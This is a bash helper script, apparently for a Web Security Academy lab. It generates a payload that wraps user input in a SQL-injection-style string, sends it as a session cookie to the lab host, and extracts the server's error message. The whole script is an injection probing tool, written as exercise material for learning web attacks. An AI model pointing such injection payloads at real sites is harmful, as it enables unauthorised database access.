#!/bin/bash

[[ "$LABID" ]] || { echo "LABID environment variable must be set."; exit 1; }

if [[ ! -f "./gen.jar" ]]; then
    printf "Generator jar not found, building ... "
    build_output=$(./build.sh 2>&1)
    if [[ $? != 0 ]]; then
        printf "Fail: %s\n" "$build_output"
        exit 1
    fi
    printf "Success\n\n"
fi

payload=$(java -jar gen.jar -- "x' $@ --")
host="$LABID.web-security-academy.net"
response=$(curl -b "session=$payload" "https://$host/")
warning=$(echo "$response" | grep -Pazo "(?s)(?<=is-warning>)(.*?)(?=</p>)" | tr -d '\0')
if [[ "$warning" ]]; then
    echo "$warning"
else
    printf "%s\n\n%s\n" "$response" "Failed to match error message, see response above."
fi